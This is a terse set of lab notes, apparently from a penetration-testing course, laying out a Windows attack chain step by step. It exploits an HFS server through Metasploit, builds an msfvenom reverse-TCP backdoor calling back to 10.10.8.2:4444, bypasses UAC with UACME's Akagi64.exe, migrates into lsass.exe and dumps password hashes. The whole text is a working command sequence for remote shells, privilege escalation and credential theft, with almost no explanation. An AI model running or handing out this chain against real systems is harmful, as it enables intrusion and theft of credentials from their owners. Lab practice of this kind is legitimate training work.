search for hfs in msfconsole  RCE 


meterpter 
- pgrep explorer ( to get number)
- migrate (number) Or migrate -N explorer.exe 
- getsystem
- shell
- net localgroup administrator (check if user administrator is memeber of administrator group)
- generate malcious file
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.8.2 LPORT=4444 -f exe > backdoor.exe
- run msfconsole use exploit/multi/handler and run listener
- set payload windows/meterpreter/reverse_tcp

 back to other msf 
- check what dir you are - pwd
- switch to user tmp directory - cd C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\temp
- upload /root/Desktop/tools/UACME/Akagi64.exe .
- upload /root/backdoor.exe
- Akagi64.exe 23 C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\temp\\\\backdoor.exe (23 is for bypassing UAC by Akagi64)

back to other msfconsole listener 
- getsystem
- getuid
- ps (to look for process to migrate, NT AUTHORITY/SYSTEM)
- migrate lsass.exe
- hashdump